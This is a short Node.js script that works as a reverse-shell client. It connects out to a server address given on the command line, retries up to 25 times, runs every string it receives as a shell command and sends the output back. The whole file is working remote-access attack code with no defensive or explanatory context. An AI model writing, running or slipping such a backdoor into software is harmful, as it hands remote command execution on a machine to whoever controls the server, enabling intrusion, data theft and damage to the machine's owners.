// @ts-check

import { connect } from "node:net";
import { exec } from "node:child_process";
import { promisify } from "node:util";

const execAsync = promisify(exec);

const SERVER_IP = process.argv[2];
const SERVER_PORT = process.argv[3];

if (!SERVER_IP) {
  console.log("please set SERVER_IP");
  process.exit();
}

if (!SERVER_PORT) {
  console.log("please set SERVER_PORT");
  process.exit();
}

let attempts = 0;

function client() {
  if (attempts > 25) {
    console.log("too many attempts");
    process.exit();
  }

  attempts++;

  console.log(`connecting to ${SERVER_IP}:${SERVER_PORT}`);

  const socket = connect(Number(SERVER_PORT), String(SERVER_IP));

  socket.on("connect", () => {
    console.log("connected");

    socket.on("data", async (data) => {
      try {
        const command = data.toString();

        const { stdout, stderr } = await execAsync(command);

        if (stderr) return socket.write(stderr);
        if (stdout) return socket.write(stdout);

        return socket.write("done\n");
      } catch (error) {
        if (error) return socket.write(error.message);
      }
    });
  });

  socket.on("end", () => {
    console.log("disconnected");
    process.exit();
  });

  socket.on("error", (/** @type {any} */ error) => {
    console.log(error);
    client();
  });
}

client();
